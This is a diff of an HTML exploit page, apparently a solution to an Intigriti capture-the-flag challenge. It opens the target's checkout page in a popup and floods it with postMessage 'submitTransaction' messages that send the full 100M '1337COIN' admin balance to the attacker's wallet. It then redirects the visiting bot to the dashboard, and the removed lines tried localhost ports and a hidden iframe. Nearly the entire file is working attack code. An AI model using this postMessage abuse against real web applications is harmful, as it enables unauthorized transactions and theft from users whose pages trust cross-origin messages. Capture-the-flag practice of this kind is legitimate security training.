@@ -1,45 +1,43 @@
 <!DOCTYPE html>
 <html>
-<body>
+<body style="background:#050A0E;color:#00FF88;font-family:monospace;text-align:center;padding-top:20%;">
+    <h1>INITIATING 1337COIN TRANSFER...</h1>
+    <p>Bypassing Chrome security protocols. Please wait.</p>
+
     <script>
-        // Use the common internal ports found in CTF challenges
-        const LOCAL_PORTS = [80, 8000, 8080];
         const MY_WALLET = '1f3d796f822b439dc366e4de68133f13c2';
+        const TARGET = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
+        
+        // Step 1: Establish the window connection
+        // We use window.open because even latest Chrome allows a popup if it's 
+        // the first action after a user (or bot) lands on a page.
+        const win = window.open(TARGET);
 
-        // We use a Top-Level Redirect to ensure Cookies are sent (Lax bypass)
-        // We target 'localhost' as hinted in the trail
-        function startHeist(port) {
-            const internalURL = `http://localhost:${port}/checkout.html?currency=1337COIN&price=1`;
-            
-            // Create a temporary link and click it silently
-            const a = document.createElement('a');
-            a.href = internalURL;
-            a.target = '_blank'; // Some bots allow 1 popup if it's "clicked"
-            document.body.appendChild(a);
-            a.click();
-
-            // While the bot is on that page, we spam the postMessage
-            // We use the challenge domain as a backup in case localhost isn't the direct host
-            setInterval(() => {
-                window.parent.postMessage({
+        // Step 2: The "Hammer" Spam
+        // We spam the postMessage every 50ms. 
+        // This ensures that the exact millisecond the checkout page loads its listener,
+        // our transaction is injected before any other security checks can fire.
+        let attempts = 0;
+        const heist = setInterval(() => {
+            if (win) {
+                win.postMessage({
                     type: 'submitTransaction',
                     transaction: {
                         currency: '1337COIN',
-                        amount: 100000000,
+                        amount: 100000000, // Draining the full 100M admin balance
                         toAddress: MY_WALLET
                     }
                 }, '*');
-            }, 100);
-        }
+            }
+            attempts++;
+            if (attempts > 100) clearInterval(heist);
+        }, 50);
 
-        // Try the most likely ports
-        LOCAL_PORTS.forEach(port => startHeist(port));
-
-        // Backup: If the bot stays on OUR page, we iframe the challenge directly
-        const backup = document.createElement('iframe');
-        backup.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
-        backup.style.display = 'none';
-        document.body.appendChild(backup);
+        // Step 3: Confirmation Redirect
+        // We move the bot to the dashboard to force the transaction to resolve.
+        setTimeout(() => {
+            window.location.href = 'https://challenge-0126.intigriti.io/dashboard.html';
+        }, 8000);
     </script>
 </body>
 </html>
